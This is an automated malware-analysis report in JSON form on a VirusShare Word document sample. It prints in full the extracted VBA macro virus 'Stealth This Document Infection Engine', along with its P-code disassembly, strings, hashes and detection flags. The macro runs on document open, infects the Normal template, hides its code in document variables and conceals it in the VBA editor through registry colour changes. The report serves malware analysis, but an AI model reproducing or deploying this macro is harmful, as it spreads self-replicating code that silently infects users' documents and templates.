{
    "docinfo": {
        "attributes": [],
        "behavior": {
            ".Variables": "May use Word Document Variables to store and hide data",
            "Chr": "May attempt to obfuscate specific str",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Close": "Runs when the Word document is closed",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "System": "May run an executable file or a system command on a Mac",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "Private Sub Document_Open()\n\nRem + - - - - - - - - - - - - - - - - - - - - - +\nRem | Stealth This Document Infection Engine    |\nRem | fast and 98 % stealth AND class infection |\nRem |                                           |\nRem | TDIE by Lord Arz      (Lord_Arz@gmx.net)  |\nRem + - - - - - - - - - - - - - - - - - - - - - +\n\nOn Error Resume Next    'catch all errors\nResetMe = String(5, Chr(13))    'generate stealth\nResetMe = ResetMe & String(300, \"   \") & \"Private Sub Document_Close(): \"   'recover code\nResetMe = ResetMe & \"With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, ThisDocument.Variables(chr(65)).Value: End With: ThisDocument.Save: \"   'recover code\nResetMe = ResetMe & \"End Sub\"   'recover code\n\nFor x = 1 To ActiveDocument.Variables.Count   'clear variables\n    ActiveDocument.Variables(x).Delete\nNext x\n\nFor x = 1 To Normal.ThisDocument.Variables.Count   'clear variables\n    Normal.ThisDocument.Variables(x).Delete\nNext x\n\nWith ThisDocument.VBProject.VBComponents(1).CodeModule  'read virus code\n    VCC = .Lines(1, .CountOfLines)\nEnd With\n\nWith ActiveDocument.VBProject.VBComponents(1).CodeModule    'delete code in Doc\n    .DeleteLines 1, .CountOfLines\n    .InsertLines 1, ResetMe 'insert stealth\nEnd With\n\nWith Normal.ThisDocument.VBProject.VBComponents(1).CodeModule   'delete code in Normal\n    .DeleteLines 1, .CountOfLines\n    .InsertLines 1, ResetMe 'insert stealth\nEnd With\n\nActiveDocument.Variables.Add (Chr(65)), VCC 'store code in variable area of Doc\nNormal.ThisDocument.Variables.Add (Chr(65)), VCC    'store code in variale area of Normal\n\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office\", \"CodeBackColors\") = \"1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\"    'change background colors\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office\", \"CodeForeColors\") = \"1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\"  'change code colors\n\nPenetrate:\n'UC (Insert user code here):\nRem\nRem\n'SP (path and program to start)\nEnd Sub\n\n' Processing file: VirusShare_230565bf166e3a4f224a2d674a176249\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 8502 bytes\n' Line #0:\n' \tFuncDefn (Private Sub Document_Open())\n' Line #1:\n' Line #2:\n' \tRem 0x002E \" + - - - - - - - - - - - - - - - - - - - - - +\"\n' Line #3:\n' \tRem 0x002E \" | Stealth This Document Infection Engine    |\"\n' Line #4:\n' \tRem 0x002E \" | fast and 98 % stealth AND class infection |\"\n' Line #5:\n' \tRem 0x002E \" |                                           |\"\n' Line #6:\n' \tRem 0x002E \" | TDIE by Lord Arz      (Lord_Arz@gmx.net)  |\"\n' Line #7:\n' \tRem 0x002E \" + - - - - - - - - - - - - - - - - - - - - - +\"\n' Line #8:\n' Line #9:\n' \tOnError (Resume Next) \n' \tQuoteRem 0x0018 0x0010 \"catch all errors\"\n' Line #10:\n' \tLitDI2 0x0005 \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tArgsLd String$ 0x0002 \n' \tSt ResetMe \n' \tQuoteRem 0x0020 0x0010 \"generate stealth\"\n' Line #11:\n' \tLd ResetMe \n' \tLitDI2 0x012C \n' \tLitStr 0x0003 \"   \"\n' \tArgsLd String$ 0x0002 \n' \tConcat \n' \tLitStr 0x001E \"Private Sub Document_Close(): \"\n' \tConcat \n' \tSt ResetMe \n' \tQuoteRem 0x004C 0x000C \"recover code\"\n' Line #12:\n' \tLd ResetMe \n' \tLitStr 0x00AB \"With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, ThisDocument.Variables(chr(65)).Value: End With: ThisDocument.Save: \"\n' \tConcat \n' \tSt ResetMe \n' \tQuoteRem 0x00C4 0x000C \"recover code\"\n' Line #13:\n' \tLd ResetMe \n' \tLitStr 0x0007 \"End Sub\"\n' \tConcat \n' \tSt ResetMe \n' \tQuoteRem 0x0020 0x000C \"recover code\"\n' Line #14:\n' Line #15:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd Variables \n' \tMemLd Count \n' \tFor \n' \tQuoteRem 0x002E 0x000F \"clear variables\"\n' Line #16:\n' \tLd x \n' \tLd ActiveDocument \n' \tArgsMemLd Variables 0x0001 \n' \tArgsMemCall Delete 0x0000 \n' Line #17:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tNextVar \n' Line #18:\n' Line #19:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd Normal \n' \tMemLd ThisDocument \n' \tMemLd Variables \n' \tMemLd Count \n' \tFor \n' \tQuoteRem 0x0033 0x000F \"clear variables\"\n' Line #20:\n' \tLd x \n' \tLd Normal \n' \tMemLd ThisDocument \n' \tArgsMemLd Variables 0x0001 \n' \tArgsMemCall Delete 0x0000 \n' Line #21:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tNextVar \n' Line #22:\n' Line #23:\n' \tStartWithExpr \n' \tLitDI2 0x0001 \n' \tLd ThisDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tWith \n' \tQuoteRem 0x0038 0x000F \"read virus code\"\n' Line #24:\n' \tLitDI2 0x0001 \n' \tMemLdWith CountOfLines \n' \tArgsMemLdWith Lines 0x0002 \n' \tSt VCC \n' Line #25:\n' \tEndWith \n' Line #26:\n' Line #27:\n' \tStartWithExpr \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tWith \n' \tQuoteRem 0x003C 0x0012 \"delete code in Doc\"\n' Line #28:\n' \tLitDI2 0x0001 \n' \tMemLdWith CountOfLines \n' \tArgsMemCallWith DeleteLines 0x0002 \n' Line #29:\n' \tLitDI2 0x0001 \n' \tLd ResetMe \n' \tArgsMemCallWith InsertLines 0x0002 \n' \tQuoteRem 0x001C 0x000E \"insert stealth\"\n' Line #30:\n' \tEndWith \n' Line #31:\n' Line #32:\n' \tStartWithExpr \n' \tLitDI2 0x0001 \n' \tLd Normal \n' \tMemLd ThisDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tWith \n' \tQuoteRem 0x0040 0x0015 \"delete code in Normal\"\n' Line #33:\n' \tLitDI2 0x0001 \n' \tMemLdWith CountOfLines \n' \tArgsMemCallWith DeleteLines 0x0002 \n' Line #34:\n' \tLitDI2 0x0001 \n' \tLd ResetMe \n' \tArgsMemCallWith InsertLines 0x0002 \n' \tQuoteRem 0x001C 0x000E \"insert stealth\"\n' Line #35:\n' \tEndWith \n' Line #36:\n' Line #37:\n' \tLitDI2 0x0041 \n' \tArgsLd Chr 0x0001 \n' \tParen \n' \tLd VCC \n' \tLd ActiveDocument \n' \tMemLd Variables \n' \tArgsMemCall Add 0x0002 \n' \tQuoteRem 0x002C 0x0022 \"store code in variable area of Doc\"\n' Line #38:\n' \tLitDI2 0x0041 \n' \tArgsLd Chr 0x0001 \n' \tParen \n' \tLd VCC \n' \tLd Normal \n' \tMemLd ThisDocument \n' \tMemLd Variables \n' \tArgsMemCall Add 0x0002 \n' \tQuoteRem 0x0034 0x0024 \"store code in variale area of Normal\"\n' Line #39:\n' Line #40:\n' \tLitStr 0x001F \"1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\"\n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x002F \"HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office\"\n' \tLitStr 0x000E \"CodeBackColors\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' \tQuoteRem 0x008C 0x0018 \"change background colors\"\n' Line #41:\n' \tLitStr 0x0021 \"1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\"\n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x002F \"HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office\"\n' \tLitStr 0x000E \"CodeForeColors\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' \tQuoteRem 0x008C 0x0012 \"change code colors\"\n' Line #42:\n' Line #43:\n' \tLabel Penetrate \n' Line #44:\n' \tQuoteRem 0x0000 0x001B \"UC (Insert user code here):\"\n' Line #45:\n' \tRem 0x0000 \"\"\n' Line #46:\n' \tRem 0x0000 \"\"\n' Line #47:\n' \tQuoteRem 0x0000 0x001E \"SP (path and program to start)\"\n' Line #48:\n' \tEndSub \n"
    },
    "filename": "VirusShare_230565bf166e3a4f224a2d674a176249",
    "filesize": 41472,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1252, Template: Cbtnorm, Last Saved By: fs080298, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Sun Oct 18 15:41:00 2099, Last Saved Time/Date: Sun Oct 18 15:41:00 2099, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "230565bf166e3a4f224a2d674a176249",
        "sha1": "46c77cdbe119a05d2fe270270b46500383d5dfe6",
        "sha256": "654e68965e88a8c42dadf0a266091c44da96cc1e100087f4c1a89a6a2ad9a1e8"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjWW",
            "/ =!",
            "sj85",
            "epform10",
            "Title",
            "_PID_GUID",
            "epform10",
            "Title",
            "_PID_GUID",
            " 36/",
            "Project",
            "rstdol",
            "{00020430-",
            "0046}#2.",
            "0#0#C:\\W",
            "INDOWS\\S",
            "YSTEM\\ST",
            "DOLE2.TL",
            " Automation",
            "mMSForm",
            "B2F03443",
            "-EEC9-11D3-99CA",
            "40954508",
            "3.TWD",
            "#Microso(ft ",
            " Library",
            "?EFA62",
            "484-32C7",
            "?ACD9-90",
            "0936D3B5",
            "P\\VBE",
            "\\@EX@.E",
            "pNDLap",
            " +\t,C",
            "2DF8D04C",
            "-5BFA-101B-BDE5]TAA",
            "ROGRAM F",
            "ILES\\MIC",
            "ROSOFT O@FFICE\\",
            "SO97.DLLC",
            "c# 8.0Rc",
            "ThisDoc@ument",
            "h@6sD",
            "*\\CNormalrU",
            "ThisDocument",
            "Project",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB",
            "Word",
            "C:\\WINDOWS\\SYSTEM\\STDOLE2.TLB",
            "stdole",
            "\u0650\t6\u04f5&",
            "C:\\WINDOWS\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "\u0650\t6\u04f5&",
            "C:\\WINDOWS\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "qr(;2",
            "\u0690\t6\u04f5&",
            "nr(;2",
            "\u0690\t6\u04f5&",
            "pr(;2",
            "\u0690\t6\u04f5&",
            "Document",
            "Document_Close",
            "VBA332.DLL",
            "i&e2",
            "\u0690\t6\u04f5&",
            "e&e2",
            "\u0690\t6\u04f5&",
            "h&e2",
            "\u0690\t6\u04f5&",
            "Document_Open",
            "Private Sub Document_Close(): ",
            "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1",
            "With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, ThisDocument.Variables(chr(65)).Value: End With: ThisDocument.Save: ",
            "End Sub",
            "CodeBackColors",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office",
            "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\t",
            "CodeForeColors",
            "n&e2",
            "\u0690\t6\u04f5&",
            "k&e2",
            "\u0690\t6\u04f5&",
            "m&e2",
            "\u0690\t6\u04f5&",
            "v&e2",
            "\u0690\t6\u04f5&",
            "s&e2",
            "\u0690\t6\u04f5&",
            "u&e2",
            "\u0690\t6\u04f5&",
            "xt5D",
            " + - - - - - - - - - - - - - - - - - - - - - +",
            " | Stealth This Document Infection Engine    |",
            " | fast and 98 % stealth AND class infection |",
            " |                                           |live-P",
            " | TDIE by Lord Arz      (Lord_Arz@gmx.net)  |",
            " + - - - - - - - - - - - - - - - - - - - - - +",
            "catch all errors",
            "generate stealth",
            "Private Sub Document_Close(): ",
            "recover code",
            "With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, ThisDocument.Variables(chr(65)).Value: End With: ThisDocument.Save: ",
            "recover code ",
            "End Sub",
            "recover code",
            "clear variables",
            "clear variables",
            "read virus code",
            "delete code in Doc",
            "insert stealth",
            "delete code in Normal",
            "insert stealthG",
            "store code in variable area of Doc",
            "store code in variale area of Normal",
            "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office",
            "CodeBackColors ",
            "change background colors",
            "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office",
            "CodeForeColors ",
            "change code colors FILES",
            "UC (Insert user code here):",
            "fice",
            "SP (path and program to start)",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "8 Sub ",
            "t_Open()",
            "Rem (+ -",
            "Stealth ",
            ", Infec",
            "tion EngPine ",
            "ast and @98 % s",
            "ND ss i",
            "E by Lord Arz",
            "@gmx.n`et)  ",
            "O@7rror ",
            "Res@ Nex",
            "'catch@ all e",
            ">setMAS@",
            "ng(5, Ch r(13)",
            "   'genergC",
            "@300, \"",
            "\" ) & \"vCl",
            "@():\t're",
            "cover co6d",
            "iDqE.VBPr",
            "ojq@",
            "Comp",
            "on@s(1).",
            "Module",
            ": .Delet",
            "eL@ys 1, ",
            "untOf",
            "Insert",
            "I .VariAs(Bc",
            "C65))",
            "EA$:",
            "$Sav",
            "F6x p1  To A`Uve",
            "-'clear v",
            "(x)\"",
            "BxAl*",
            ";;Rd vi",
            "rusdG",
            "VCC '.b:(M>7",
            "K\"'dBK\"",
            "/zND",
            "Ne^'iQ\u014e",
            "vWAdd (Sj, 6'",
            "e)Y a of",
            "m.Dfiled",
            "\"\"HKEY_",
            "CURRENT_",
            "USER\\Sof",
            "tw \t\\Micr",
            "\\VBA\\OfficeA",
            "BackColors`",
            " 'change b",
            "grou Gc\"",
            "0@eo",
            "ct!c:",
            "'UC (#",
            "here.)",
            "}dmp",
            "SP0 (pa^wpr",
            "ogram to10art;",
            "15ffffffff",
            "\u0690\t6\u04f5&",
            "q&e2",
            "\u0690\t6\u04f5&",
            "Wordk",
            "Win16~",
            "Win32",
            "sample16",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Documentj",
            "Document_Close7\\",
            "VBProjectOh",
            "VBComponents",
            "CodeModule",
            "DeleteLines",
            "CountOfLines!\\",
            "InsertLines",
            "Variablesn",
            "ChrK~",
            "ValueK",
            "Save",
            "Itemz",
            "_B_var_Chr\\;",
            "Document_Open",
            "ResetMe",
            "ActiveDocument\\",
            "Count0v",
            "Deletex",
            "Lines",
            "Addr",
            "Systema",
            "PrivateProfileString[",
            "Penetrate",
            "_B_var_String\u04ca",
            "_B_var_ResetMe",
            "_B_var_x",
            "_B_var_VCC/",
            "ID=\"{3B287272-32CC-11D3-ACDA-900936D3B526}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"7E7CC536C736CC3ACC3ACC3ACC3A\"",
            "DPB=\"7F7DC439C43BC43CC43CC4\"",
            "GC=\"80823B3C3C3C3CC3\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "ThisDocument",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8",
            "Cbtnorm",
            "fs080298",
            "Microsoft Word 8.0"
        ],
        "file": {
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB": "Autogen",
            "VBA332.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.336104",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
